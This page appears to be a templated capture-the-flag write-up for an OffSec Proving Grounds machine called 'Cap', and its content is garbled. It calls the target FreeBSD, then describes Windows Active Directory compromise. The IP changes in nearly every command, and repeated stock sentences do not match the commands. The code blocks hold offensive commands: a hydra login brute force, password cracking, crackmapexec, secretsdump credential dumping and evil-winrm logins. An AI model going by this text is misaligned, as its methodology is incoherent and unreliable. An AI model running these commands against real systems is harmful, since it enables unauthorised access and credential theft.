---
TitleSEO: "OffSec Proving Grounds — Cap (Easy FreeBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Cap (Easy FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Cap. DNS Rebinding and LXD Privilege Escalation to achieve easy compromise on FreeBSD."
Keywords: "insane, active directory, windows, hackthebox, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-cap-779.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-cap-779/"
Date: "2025-10-13"
Tags: "Insane, Active Directory, Windows, HackTheBox, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-cap-779"
Permalink: "/writeups/htb-cap-779.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Cap** is rated **Easy** on OffSec Proving Grounds. It runs **FreeBSD** and the IP address during this analysis was `10.111.58.179`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p3268,1433,443 10.59.11.191 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.66.82.124/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.42.78.151 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.31.5.1/FUZZ
```

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

### Service Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.12.123.94 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.110.99.69/FUZZ
```

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.112.53.149 -u administrator -p 'P@ssw0rd!' --shares
```

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

Key finding: **NTLM Relay**.

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

### Initial Access

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

```bash
crackmapexec smb 10.18.95.192 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.88.2.225
```

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

## Privilege Escalation

### Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.114.93.91 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

```powershell
evil-winrm -i 10.44.157.75 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.120.227.132 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.62.45.185/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `gobuster`
- `burpsuite`
- `hashcat`
- `bloodhound`
- `chisel`
- `kerbrute`
- `nikto`

### Key Takeaways

- DNS Rebinding
- LXD Privilege Escalation
- NTLM Relay
- XSS
